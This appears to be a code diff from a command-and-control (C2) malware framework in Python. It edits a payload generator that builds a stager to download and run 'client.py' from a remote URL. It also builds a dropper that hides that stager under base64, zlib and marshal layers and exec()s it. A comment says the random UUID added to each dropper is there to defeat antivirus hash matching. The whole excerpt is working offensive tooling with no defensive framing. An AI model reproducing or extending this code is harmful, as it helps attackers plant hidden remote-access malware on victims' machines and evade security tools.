@@ -134,7 +134,8 @@ class C2:
         if not os.path.isdir('payloads'):
             os.makedirs('payloads')
 
-        payload = f"""url = '{url}'
+
+        payload = f"""url = "{url}"
 def create_moduel(url):
   code = urlopen(url).read().decode('utf-8')
   spec = importlib.util.spec_from_loader('temp', loader=None)
@@ -149,7 +150,7 @@ create_moduel(url+"client.py").run(url)"""
         dropper = f"""import sys,zlib,base64,marshal,json,urllib,socketio,geocoder,requests,importlib.util
 from urllib.request import urlopen
 urlopen = urllib.request.urlopen if sys.version_info[0] > 2 else urllib.urlopen
-exec(eval(marshal.loads(zlib.decompress(base64.b64decode({repr(base64.b64encode(zlib.compress(marshal.dumps(payload,2))))})))))
+exec((marshal.loads(zlib.decompress(base64.b64decode({repr(base64.b64encode(zlib.compress(marshal.dumps(payload,2))))}))))
 #{uuid.uuid4()}"""
         #this will prevent anti-viruses from looking for hashes of the script
         
